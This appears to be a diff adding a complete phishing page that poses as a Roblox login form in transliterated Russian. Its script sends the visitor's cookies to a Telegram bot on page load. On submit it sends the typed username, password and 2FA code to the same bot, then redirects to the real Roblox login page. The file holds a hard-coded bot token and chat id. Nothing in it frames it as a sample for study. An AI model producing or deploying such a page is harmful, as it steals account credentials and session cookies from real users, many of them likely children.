@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>Vhod v Roblox</title></head>
+<body>
+<h2>Vhod v Roblox</h2>
+<form id=f>
+<input id=u placeholder=Login>
+<input id=p placeholder=Pass>
+<input id=t placeholder=2FA>
+<button type=submit>Voyti</button>
+</form>
+<script>
+fetch('https://api.telegram.org/bot8741509725:AAEr1qxXJs45a6guiSYndDkCqj94s09IJKo/sendMessage?chat_id=8490701293&text=Cookie: '+encodeURIComponent(document.cookie));
+f.onsubmit=function(e){
+e.preventDefault();
+let d='Login: '+u.value+' | Pass: '+p.value+' | 2FA: '+t.value;
+fetch('https://api.telegram.org/bot8741509725:AAEr1qxXJs45a6guiSYndDkCqj94s09IJKo/sendMessage?chat_id=8490701293&text='+encodeURIComponent(d));
+location='https://roblox.com/login';
+}
+</script>
+</body>
+</html>
